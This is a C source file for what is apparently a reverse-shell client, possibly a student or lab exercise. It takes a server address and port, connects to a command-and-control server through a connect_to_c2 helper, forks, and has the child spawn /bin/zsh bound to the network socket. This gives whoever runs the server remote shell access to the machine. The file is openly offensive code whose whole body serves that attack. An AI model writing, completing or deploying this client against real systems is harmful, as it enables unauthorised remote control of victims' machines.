#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>         // signal, SIGCHLD (if you choose)
#include <sys/types.h>      // pid_t
#include <sys/wait.h>       // waitpid
#include <unistd.h>         // close, fork
#include "net.h"
#include "shell.h"


// #define STDIN_FILENO 0
// #define STDOUT_FILENO 1
// #define STDERR_FILENO 2

int main(int argc, char *argv[])  {
    // parse server address and port from command line arguments
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <server_address> <port>\n", argv[0]);
        return 1;
    }

    // store server address and port
    const char *server_address = argv[1];
    const char *port_str = argv[2];
    uint16_t port = 0;

    if (parse_port(port_str, &port) != 0) {
        perror("Invalid port");
        return 1;
    }

    // connect to the server
    int network_socket = connect_to_c2(server_address, port);
    if (network_socket == -1) {
        fprintf(stderr, "Failed to connect to %s:%s\n", server_address, port_str);
        return 1;
    }

    // fork a new process
    pid_t pid = fork();
    if (pid == 0) {
        // child process
        if (spawn_shell(network_socket, "/bin/zsh") == -1) {
            perror("Failed to spawn shell");
            close(network_socket);
            exit(1);
        }
        exit(1);
    } else if ( pid > 0) {
        close(network_socket);
        exit(0);
    } else {
        perror("Fork failed");
        close(network_socket);
        return 1;
    }

    // close the socket after use
    close(network_socket);

    // end of the main function
    return 0;
}